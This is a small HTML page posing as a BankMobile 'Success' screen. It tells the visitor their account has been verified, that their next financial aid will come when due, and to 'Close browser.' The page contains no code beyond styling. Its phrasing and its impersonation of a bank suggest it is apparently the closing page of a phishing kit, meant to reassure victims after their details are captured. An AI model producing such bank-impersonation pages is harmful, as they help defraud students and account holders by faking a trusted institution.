<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Success â€” BankMobile</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --accent: #0070ff; /* green */
      --bg: #f9fbff;
      --shadow: 0 6px 18px rgba(17,24,39,0.08);
      --text-muted: #374151;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Inter", sans-serif;
      background: var(--bg);
      color: #111827;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: white;
      padding: 32px 24px;
      border-radius: 12px;
      box-shadow: var(--shadow);
      width: 100%;
      max-width: 420px;
      text-align: center;
    }
    .icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 18px;
    }
    .icon svg {
      width: 100%;
      height: 100%;
    }
    .message {
      font-size: 15px;
      line-height: 1.5;
      color: var(--text-muted);
    }
    @media (max-width: 480px) {
      .card { padding: 24px 16px; }
      .icon { width: 64px; height: 64px; margin-bottom: 14px; }
      .message { font-size: 14px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon" aria-hidden="true">
      <!-- Success checkmark SVG -->
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="var(--accent)"/>
        <path d="M8 12.5l2.5 2.5L16 9.5" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <p class="message">
      You have successfully verified your account and you will receive your next financial aid when the time is due. 
      A customer representative might reach out. Close browser.
    </p>
  </div>
</body>
</html>
